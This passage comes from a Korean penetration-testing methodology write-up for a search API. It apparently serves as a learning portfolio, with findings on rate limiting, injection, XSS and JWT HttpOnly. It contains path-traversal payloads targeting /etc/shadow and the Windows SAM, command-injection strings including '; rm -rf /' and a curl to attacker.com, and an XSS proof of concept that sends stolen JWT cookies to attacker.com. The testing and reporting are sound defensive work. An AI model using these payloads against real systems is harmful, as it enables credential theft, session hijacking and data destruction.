    ("..\\..\\..\\windows\\system32\\config\\sam", "Windows SAM"),
    ("/etc/shadow", "shadow 파일"),
    ("C:\\boot.ini", "Windows boot"),
    ("....//....//....//etc/passwd", "점 4개 우회"),
    # ... 20개
]
```

**우회 기법:**

| 기법 | 페이로드 | 목적 |
|------|----------|------|
| 기본 | `../../etc/passwd` | 상위 디렉토리 이동 |
| Windows | `..\\..\\..\\` | 백슬래시 사용 |
| 절대 경로 | `/etc/passwd` | 루트부터 접근 |
| 점 4개 | `....//` | 필터 우회 |
| URL 인코딩 | `%2e%2e%2f` | 디코딩 후 실행 |
| Double 인코딩 | `%252e%252e%252f` | 2중 디코딩 |

**실제 테스트 결과:**
- 모든 Path Traversal 페이로드 → 200 OK
- **안전**: query_string이 파일 경로로 사용되지 않음
- Elasticsearch는 텍스트 검색만 수행

### 8.5 Command Injection 테스트

```python
command_payloads = [
    ("; ls -la", "세미콜론 구분자"),
    ("| cat /etc/passwd", "파이프 연산자"),
    ("& whoami", "백그라운드 실행"),
    ("`id`", "백틱 명령 치환"),
    ("$(curl http://attacker.com)", "달러 괄호"),
    # ... 15개
]
```

**왜 Command Injection을 테스트하나?**

**가능한 시나리오:**
```python
# 취약한 코드 (절대 이렇게 하면 안됨!)
import subprocess

@app.get("/search")
def search(query_string: str):
    # grep으로 파일 검색
    cmd = f"grep {query_string} /data/trademarks.txt"
    result = subprocess.run(cmd, shell=True)  # 🚨 위험!
    return result.stdout
```

**공격 시나리오:**
```bash
# 정상 요청
query_string = "삼성"
실행: grep 삼성 /data/trademarks.txt

# 공격 요청
query_string = "; rm -rf /"
실행: grep ; rm -rf / /data/trademarks.txt
→ 1. grep (공백으로 실패)
→ 2. rm -rf / (시스템 파괴!)
```

**실제 테스트 결과:**
- 모든 Command Injection 페이로드 → 200 OK
- **안전**: 시스템 명령어를 전혀 사용하지 않음
- Elasticsearch API만 사용

---

## 9. 테스트 6: XSS 및 JWT 보안 분석

### 9.1 왜 브라우저 테스트로 전환했나?

**API 테스트의 한계:**
```python
# test02_input_validation.py
response = requests.get(BASE_URL, params={"query_string": "<script>alert('xss')</script>"})
print(response.json())

# 결과
{
  "request_data": {
    "query_string": "<script>alert('xss')</script>"
  }
}
```

**문제:**
- API는 단순히 문자열로 반환
- **실제 XSS는 브라우저에서 발생** (HTML 파싱)
- 프론트엔드가 어떻게 렌더링하는지 알 수 없음

**해결책:**
1. Selenium으로 자동화 (시도했으나 로그인 복잡)
2. **수동 브라우저 테스트** (선택)

### 9.2 브라우저 개발자 도구 활용

**왜 개발자 도구를 사용하나?**

**장점:**
- **실시간 DOM 확인**: HTML이 어떻게 렌더링되는지 직접 확인
- **JavaScript 실행**: 즉시 테스트 가능
- **네트워크 탭**: 요청/응답 분석
- **쿠키 확인**: JWT 토큰 보안 검증

**사용한 명령어:**

```javascript
// 1. XSS 페이로드가 DOM에 어떻게 저장되었는지 확인
document.body.innerHTML.includes('<img src=x onerror')
// → false (태그 없음)

document.body.innerHTML.includes('&lt;img src=x')
// → true (이스케이프됨)
```

**왜 이 방법을 사용했나?**
- **includes()**: 문자열 검색 (간단, 빠름)
- **정확한 확인**: 태그가 HTML로 파싱되었는지 vs 텍스트인지 구분

```javascript
// 2. 특정 요소의 innerHTML 확인
document.querySelector('.SearchAreaExportType_expertContainer___7wqy').innerHTML
// → "&lt;img src=x onerror=document.body.style.background='red'&gt;"
```

**왜 querySelector를 사용했나?**
- **정확한 위치 파악**: 검색어가 어디에 표시되는지
- **CSS 선택자**: 클래스명으로 특정 요소만 추출
- **다중 요소 확인**: `querySelectorAll()`로 모든 위치 검사

### 9.3 HTML 이스케이프 분석

**발견된 결과:**
```javascript
// 입력
<img src=x onerror=console.log('XSS_FOUND')>

// DOM에 저장된 값
&lt;img src=x onerror=console.log('XSS_FOUND')&gt;
```

**이스케이프 테이블:**

| 문자 | 이스케이프 | 의미 |
|------|------------|------|
| `<` | `&lt;` | Less Than |
| `>` | `&gt;` | Greater Than |
| `"` | `&quot;` | Quote |
| `'` | `&#x27;` | Apostrophe |
| `&` | `&amp;` | Ampersand |

**왜 이스케이프가 중요한가?**

```html
<!-- 이스케이프 안됨 (취약) -->
<div>검색어: <img src=x onerror=alert('xss')></div>
→ 브라우저가 <img> 태그로 파싱 → JavaScript 실행

<!-- 이스케이프됨 (안전) -->
<div>검색어: &lt;img src=x onerror=alert('xss')&gt;</div>
→ 브라우저가 텍스트로 표시 → JavaScript 실행 안됨
```

**사용된 프론트엔드 기술 추정:**

```javascript
// 안전한 방법 (추정)
element.textContent = userInput;  // HTML을 자동 이스케이프

// 또는
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 또는 React
<div>{userInput}</div>  // JSX는 자동 이스케이프
```

### 9.4 JWT 토큰 보안 분석

**테스트 과정:**

```javascript
// 1. 쿠키 확인
document.cookie
// → "myToken=[REDACTED_JWT_TOKEN].; rfToken=eyJ0eXAi..."
```

**왜 이 명령어를 사용했나?**
- **document.cookie**: JavaScript로 쿠키 접근
- **HttpOnly 확인**: HttpOnly 쿠키는 `document.cookie`에 보이지 않음

```javascript
// 2. 토큰 접근 가능 여부
document.cookie.includes('myToken')
// → true 🚨 (HttpOnly 미설정!)

document.cookie.includes('rfToken')
// → true 🚨
```

**결론:**
- JWT 토큰이 JavaScript로 읽기 가능
- XSS 공격 시 토큰 탈취 가능

**공격 시나리오 (PoC):**
```javascript
// 만약 XSS 취약점이 있었다면...
<img src=x onerror="
  // 1. 토큰 추출
  const token = document.cookie.match(/myToken=([^;]+)/)[1];

  // 2. 공격자 서버로 전송
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: token,
      url: window.location.href,
      user: localStorage.getItem('user')
    })
  });
">
```

### 9.5 JWT 토큰 디코딩 및 분석

```javascript
// 3. 토큰 추출
const token = document.cookie.match(/myToken=([^;]+)/)[1];
console.log(token.substring(0, 50));
// → "[REDACTED_JWT_TOKEN].."
```

**왜 정규표현식을 사용했나?**
```javascript
/myToken=([^;]+)/
//        ^^^^^^
//        [^;]+: 세미콜론이 아닌 문자 1개 이상
//        (...): 그룹으로 캡처

// 쿠키 형식: "myToken=값; rfToken=값; _ga=값"
// match()[1]: 첫 번째 캡처 그룹 (토큰 값만)
```

**JWT 구조 분석:**
```
[REDACTED_JWT_TOKEN]..  .dO0q3z0Ia2odf9_G15Y-lxUi6wO7RUc0DYpjsX9kLHQ
└──────────── Header ─────────────┘ └── Payload ──┘  └───────── Signature ────────┘
```

**디코딩 (https://jwt.io):**
```json
// Header
{
  "typ": "JWT",
  "alg": "HS256"  // HMAC SHA-256
}

// Payload
{
  "iss": "https://www.example-target.com",
  "sub": "1234",              // 사용자 ID
  "role": "admin_user",       // 권한 🚨
  "is_admin": false,
  "login_ip": "192.0.2.100", // IP 주소 🚨
  "exp": 1764298043,          // 만료 시간
  "jti": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

**발견된 보안 이슈:**
1. **role이 평문**: 토큰 탈취 시 권한 노출
2. **login_ip 노출**: 프라이버시 문제
3. **sub (사용자 ID)**: IDOR 공격에 활용 가능

**HttpOnly 미설정의 위험성:**

| 시나리오 | HttpOnly=true | HttpOnly=false |
|----------|---------------|----------------|
| XSS 공격 시 | ✅ 토큰 보호됨 | 🚨 토큰 탈취됨 |
| 정상 API 요청 | ✅ 자동 전송 | ✅ 자동 전송 |
| JavaScript 접근 | ❌ 불가능 | ✅ 가능 |

---

## 10. 도구 및 기술 선택 이유

### 10.1 Python + requests

**왜 Python을 선택했나?**

**대안 비교:**

```bash
# 1. curl (Bash)
for i in {1..150}; do
  curl "https://www.example-target.com/api/expert_search?page=$i&size=10"
done

# 단점:
# - 복잡한 로직 구현 어려움 (통계, 로그)
# - 에러 처리 불편
# - JSON 파싱 어려움
```

```javascript
// 2. Node.js + axios
const axios = require('axios');
for (let i = 0; i < 150; i++) {
  await axios.get('https://www.example-target.com/api/expert_search', {
    params: {page: i, size: 10}
  });
}

// 단점:
// - 비동기 처리 복잡 (async/await)
// - 에러 처리 장황
// - 파일 I/O 불편
```

```python
# 3. Python + requests (선택)
import requests
for i in range(1, 151):
    response = requests.get(
        'https://www.example-target.com/api/expert_search',
        params={'page': i, 'size': 10}
    )

# 장점:
# - 간결한 문법
# - 동기 처리 (이해하기 쉬움)
# - 파일 I/O 간편
# - JSON 자동 파싱
# - 예외 처리 우아함
```

**선택 이유 요약:**
1. **학습 곡선**: Python이 가장 쉬움
2. **생산성**: 적은 코드로 많은 기능
3. **가독성**: 포트폴리오에 적합
4. **커뮤니티**: 보안 테스트 예제 많음

### 10.2 로그 파일 시스템

**왜 로그를 파일로 저장했나?**

```python
# 콘솔만 사용 (저장 안됨)
print("테스트 결과: 성공")

# 파일로 저장 (선택)
log_file = open(f"logs/test01_{timestamp}.log", "w")
log_file.write("테스트 결과: 성공\n")
```

**파일 저장의 장점:**
1. **증거 보존**: 나중에 다시 확인 가능
2. **비교 분석**: 여러 테스트 결과 비교
3. **포트폴리오**: 실제 로그 파일 첨부
4. **재현성**: 테스트 과정 추적 가능

**타임스탬프 포맷 선택:**
```python
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
# → 20251128_095649

# 왜 이 포맷을 선택했나?
# - 파일명에 사용 가능 (콜론 없음)
# - 정렬 가능 (연도-월-일-시-분-초)
# - 중복 방지 (초 단위)
```

### 10.3 Selenium vs 수동 테스트

**왜 Selenium 대신 수동 테스트를 했나?**

**Selenium 시도:**
```python
# test02_xss_test_script.py (작성했으나 미사용)
from selenium import webdriver
driver = webdriver.Chrome()
driver.get("https://www.example-target.com/service")

# 문제점:
# 1. 로그인 필요 → 자동화 복잡
# 2. CAPTCHA 가능성
# 3. 동적 요소 대기 필요
# 4. 시간 소요 (5분 vs 30초)
```

**수동 테스트 선택:**
```javascript
// 브라우저 개발자 도구에서 직접 실행
document.querySelector('.search-input').value = "<img src=x onerror=alert('xss')>";
document.querySelector('.search-button').click();

// 장점:
// 1. 즉시 실행 (로그인만 하면 됨)
// 2. 유연성 (필요한 테스트만)
// 3. 디버깅 쉬움 (콘솔 확인)
```

**의사결정 프로세스:**
1. Selenium 스크립트 작성 (자동화 시도)
2. 로그인 복잡성 발견
3. 시간 대비 효율 계산
4. **수동 테스트로 전환** (실용적 선택)

### 10.4 통계 추적 시스템

**왜 통계를 수집했나?**

**비교:**

```python
# 통계 없음
print("✓ 요청 성공")
print("✗ 요청 실패")
...

# 결과: 개별 로그만 있음
```

```python
# 통계 수집 (선택)
test_statistics = {
    "total_tests": 0,
    "status_codes": {},
    "response_times": []
}

# 결과:
# 총 테스트: 55개
# 성공률: 67.9%
# 평균 응답시간: 0.23초
# TOP 5 느린 테스트 출력
```

**통계의 가치:**
1. **한눈에 파악**: 전체 현황 즉시 이해
2. **이상 탐지**: 평균에서 벗어난 값 발견
3. **비교 분석**: 수정 전후 비교
4. **전문성**: 데이터 기반 의사결정

---

## 11. 테스트 과정에서의 의사결정

### 11.1 테스트 순서 결정

**왜 이 순서로 테스트했나?**

```
1. Rate Limiting (가용성)
2. Input Validation (무결성)
3. Auth/Authz (기밀성)
4. Error Handling (정보 노출)
5. Injection (심화)
6. XSS + JWT (프론트엔드)
```

**의사결정 근거:**

**1단계: Rate Limiting**
- **이유**: 가장 쉽고 빠름 (15초)
- **영향**: 서비스 전체 다운 가능
- **간섭**: 다른 테스트에 영향 없음

**2단계: Input Validation**
- **이유**: 기본 보안의 핵심
- **의존성**: Rate Limiting 결과 불필요
- **범위**: 가장 광범위 (55개 테스트)

**3단계: Auth/Authz**
- **이유**: Input Validation 이해 필요
- **복잡도**: HPP, IDOR 등 고급 공격

**4단계: Error Handling**
- **이유**: 앞선 테스트에서 발견한 에러 분석
- **통계**: 응답 시간 등 메타데이터 수집

**5단계: Injection**
- **이유**: 가장 많은 페이로드 (85개)
- **전문성**: 별도 파일로 체계화

**6단계: XSS + JWT**
- **이유**: 브라우저 필요 (별도 환경)
- **마지막**: 로그인 필요 (사용자 인터렉션)

### 11.2 페이로드 개수 결정

**왜 이런 개수를 선택했나?**

| 테스트 | 페이로드 수 | 이유 |
|--------|-------------|------|
| Rate Limiting | 150개 | 10/분 제한 탐지 |
| Input Validation | 55개 | 모든 파라미터 조합 |
| SQL Injection | 30개 | 주요 기법 커버 |
| NoSQL Injection | 12개 | Elasticsearch 특화 |
| Path Traversal | 20개 | OS별 경로 |
| Command Injection | 15개 | 주요 연산자 |
| XSS | 5개 | 수동 테스트 |

**Balance 고려:**
- **너무 적으면**: 취약점 놓침
- **너무 많으면**: 시간 낭비, 로그 복잡
- **적정선**: 각 기법의 대표 페이로드

### 11.3 에러 발견 시 대응

**HPP 버그 발견 사례:**

```python
# 1. 초기 코드 (버그)
hpp_payloads = [
    {"page": 1, "page": -1},  # 마지막 값만 유지됨
]

# 2. 테스트 실행 → 예상과 다른 결과

# 3. 디버깅
print({"page": 1, "page": -1})  # {'page': -1}

# 4. 원인 파악: Python 딕셔너리 특성

# 5. 수정
hpp_payloads = [
    {"page": [1, -1]},  # 배열로 전송
]

# 6. 재테스트 → 성공
```

**학습 포인트:**
- **실패는 학습 기회**: 더 깊이 이해
- **디버깅 과정 문서화**: 사고 과정 중요
- **도구 이해**: Python, requests 동작 원리

### 11.4 범위 조정

**왜 일부 테스트는 하지 않았나?**

**제외한 테스트:**
1. **로그인 엔드포인트**: 별도 프로젝트로 분리
2. **관리자 페이지**: 권한 없음
3. **CSRF**: SameSite 쿠키 추정
4. **CORS**: 브라우저 정책, API 범위 벗어남

**포함 근거:**
- **명확한 범위**: `/api/expert_search` 집중
- **깊이 vs 넓이**: 넓게 보다 깊게
- **실용성**: 실제 발견 가능성 높은 취약점

---

## 12. 학습 포인트 및 인사이트

### 12.1 기술적 학습

**1. FastAPI + Pydantic 이해**
```python
# Pydantic의 강력한 검증
class SearchRequest(BaseModel):
    page: int = Field(ge=1, description="페이지 번호")
    size: int = Field(ge=1, le=300, description="페이지 크기")

# 자동 검증:
# - 타입 (int)
# - 범위 (ge=1, le=300)
# - 422 에러 자동 반환
```

**왜 중요한가?**
- 현대 API 개발 트렌드 이해
- 안전한 코드 작성 방법 학습
- 포트폴리오: FastAPI 지식 증명

**2. Elasticsearch 아키텍처**
```
사용자 입력 → FastAPI → Elasticsearch Query DSL → 검색 결과

보안:
- SQL Injection 불가능 (SQL 엔진 없음)
- NoSQL Injection도 안전 (적절한 파서)
```

**3. JWT 보안 Best Practices**
```python
# 나쁜 예 (발견됨)
response.set_cookie("myToken", token)

# 좋은 예
response.set_cookie(
    "myToken", token,
    httponly=True,   # XSS 방어
    secure=True,     # HTTPS만
    samesite="strict"  # CSRF 방어
)
```

### 12.2 침투 테스트 방법론

**1. 가설 기반 테스트**
```
가설: "Elasticsearch 사용 → NoSQL Injection 가능?"
테스트: NoSQL 페이로드 12개
결과: 모두 안전
결론: 적절한 쿼리 파서 사용
```

**2. 점진적 심화**
```
1단계: 기본 SQL Injection (' OR '1'='1)
2단계: UNION 기반 (데이터 유출)
3단계: Time-based Blind
4단계: Second-order Injection (미실시)
```

**3. 증거 기반 분석**
```
주장: "Rate Limiting이 없다"
증거:
  - 150개 요청 모두 200 OK
  - 429 응답 0회
  - 로그 파일: test01_rate_limit_20251128_095649.log
```

### 12.3 보안 사고방식

**1. Defense in Depth (다층 방어)**
```
현재:
✅ XSS 방어 (프론트엔드 이스케이프)
✅ SQL Injection 방어 (Elasticsearch)
✅ Input Validation (Pydantic)
❌ Rate Limiting
❌ JWT HttpOnly

결론: 한 층이 뚫리면 전체 위험
```

**2. 공격자 관점 (Attacker's Mindset)**
```
질문: "내가 공격자라면 어떻게 할까?"

1. 대량 데이터 수집 → Rate Limiting 확인
2. 인증 우회 → IDOR, SQL Injection
3. 세션 탈취 → XSS + JWT
4. 서비스 마비 → DoS, 느린 쿼리
```

**3. 위험 우선순위**
```
Critical (7.0+):
  - Rate Limiting 부재
  - JWT HttpOnly 미설정

High (4.0-6.9):
  - (없음)

Medium (0.1-3.9):
  - page=999999 에러
  - 서버 정보 노출
```

### 12.4 커뮤니케이션

**1. 비기술 담당자에게 설명**
```
❌ "CVSS 7.5의 CWE-770 취약점 발견"
✅ "서버가 DDoS 공격에 취약합니다.
   공격자가 1분에 1000번 요청하면 서비스가 다운될 수 있습니다."
```

**2. 기술 담당자에게 제안**
```python
# 문제 설명
현재: Rate Limiting 없음

# 해결 방법 (코드 포함)
@limiter.limit("10/minute")
async def expert_search():
    ...

# 검증 방법
curl -i (11번째 요청 시 429 확인)
```

**3. 경영진에게 보고**
```
위험: 하루 매출 손실 가능성
원인: DDoS 공격 방어 없음
비용: 개발 2시간 (SlowAPI 추가)
효과: 99.9% 가용성 보장
```

### 12.5 포트폴리오 가치

**이 프로젝트로 증명할 수 있는 것:**

1. **기술 역량**
   - Python 프로그래밍
   - HTTP/REST API 이해
   - 웹 보안 지식 (OWASP Top 10)
   - 도구 활용 (requests, Selenium, DevTools)

2. **문제 해결**
   - 버그 발견 및 수정 (HPP 딕셔너리)
   - 가설 검증 (Elasticsearch 추론)
   - 우선순위 결정 (테스트 순서)

3. **문서화**
   - 체계적 보고서 (SECURITY_REPORT.md)
   - 방법론 설명 (본 문서)
   - 코드 주석 (왜 이렇게 했는지)

4. **전문성**
   - CVSS 점수 계산
   - CWE 분류
   - 실용적 제안 (코드 포함)

5. **윤리**
   - 파괴적 테스트 자제
   - 책임 있는 공개
   - 해결 방법 제시

---

## 13. 결론 및 다음 단계

### 13.1 주요 발견 요약

**치명적 취약점 (2개):**
1. Rate Limiting 완전 부재 → DDoS 취약
2. JWT HttpOnly 미설정 → 세션 탈취 가능

**강점 (5개):**
1. Pydantic 입력 검증 우수
2. XSS 방어 완벽
3. SQL/NoSQL Injection 안전
4. 적절한 에러 메시지
5. 빠른 응답 속도

### 13.2 테스트 커버리지

```
테스트한 영역:
✅ OWASP A01 (Broken Access Control)
✅ OWASP A03 (Injection)
✅ OWASP A04 (Insecure Design) - Rate Limiting
✅ OWASP A05 (Security Misconfiguration)
✅ OWASP A07 (Authentication Failures) - JWT

미테스트 영역:
⬜ OWASP A02 (Cryptographic Failures)
⬜ OWASP A06 (Vulnerable Components)
⬜ OWASP A08 (Integrity Failures)
⬜ OWASP A09 (Logging Failures)
⬜ OWASP A10 (SSRF)
```

### 13.3 학습 성과

**Before (테스트 전):**
- 보안 테스트 = "해킹"이라는 막연한 개념
- 도구만 사용하면 될 것이라는 착각

**After (테스트 후):**
- 체계적 방법론 (OWASP, PTES)
- 가설 → 테스트 → 분석 → 보고
- 코드 수준의 이해 (왜 안전한지/취약한지)
- 실용적 해결책 제시

### 13.4 다음 단계

**1. 추가 테스트 (1주일)**
- [ ] 로그인 엔드포인트 테스트
- [ ] CSRF 토큰 검증
- [ ] Session Fixation
- [ ] Brute Force 방어

**2. 자동화 (2주일)**
- [ ] Selenium 자동화 완성
- [ ] CI/CD 통합
- [ ] 정기 스캔 (주 1회)

**3. 심화 학습 (1개월)**
- [ ] OSCP 자격증 준비
- [ ] Bug Bounty 참여
- [ ] 오픈소스 기여

---

## 부록

### A. 참고 자료

**OWASP:**
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Testing Guide v4: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet: https://cheatsheetseries.owasp.org/

**보안 표준:**
- CVSS v3.1 Calculator: https://www.first.org/cvss/calculator/3.1
- CWE Top 25: https://cwe.mitre.org/top25/
- PTES: http://www.pentest-standard.org/

**학습 자료:**
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox: https://www.hackthebox.com/
- DVWA (Damn Vulnerable Web App): https://github.com/digininja/DVWA

### B. 테스트 파일 목록

```bash
security-test/
├── test01_rate_limit.py              # Rate Limiting 테스트 (150 요청)
├── test02_input_validation.py        # Input Validation (55 테스트)
├── test03_auth_deep.py               # Auth/IDOR/HPP (20 테스트)
├── test04_error_handling.py          # Error Handling (28 테스트)
├── test05_injection.py               # Injection 공격 (85 페이로드)
├── test02_xss_test_script.py         # Selenium XSS (준비)
├── test_xss_browser.html             # 브라우저 XSS 데모
├── logs/
│   ├── test01_rate_limit_20251128_095649.log
│   ├── test02_input_validation_20251128_095932.log
│   ├── test04_error_handling_20251127_210031.log
│   └── test05_injection_20251128_094647.log
├── README.md                         # 프로젝트 개요
├── SECURITY_REPORT.md                # 최종 보고서
└── PENETRATION_TEST_METHODOLOGY.md   # 본 문서
```

### C. 명령어 빠른 참조

```bash
# 모든 테스트 실행
python test01_rate_limit.py
python test02_input_validation.py
python test03_auth_deep.py
python test04_error_handling.py
python test05_injection.py

# 로그 확인
ls -lh logs/
cat logs/test01_rate_limit_*.log

# HTTP 헤더 확인
curl -I https://www.example-target.com/api/expert_search

# JWT 디코딩
# https://jwt.io 에서 토큰 붙여넣기
```

### D. 브라우저 테스트 명령어

```javascript
// XSS 테스트
document.body.innerHTML.includes('<script>')
document.querySelector('.search-result').innerHTML

// JWT 확인
document.cookie
document.cookie.includes('myToken')

// 토큰 추출
const token = document.cookie.match(/myToken=([^;]+)/)[1]
console.log(token)

// LocalStorage 확인
localStorage
sessionStorage
```

---

**최종 업데이트:** 2025-11-28
**문서 버전:** 1.0
**작성자:** Security Penetration Testing Team

**이 문서의 활용:**
- 포트폴리오 첨부
- 면접 준비 (기술 질문 대비)
- 학습 복습
- 다른 프로젝트 참고
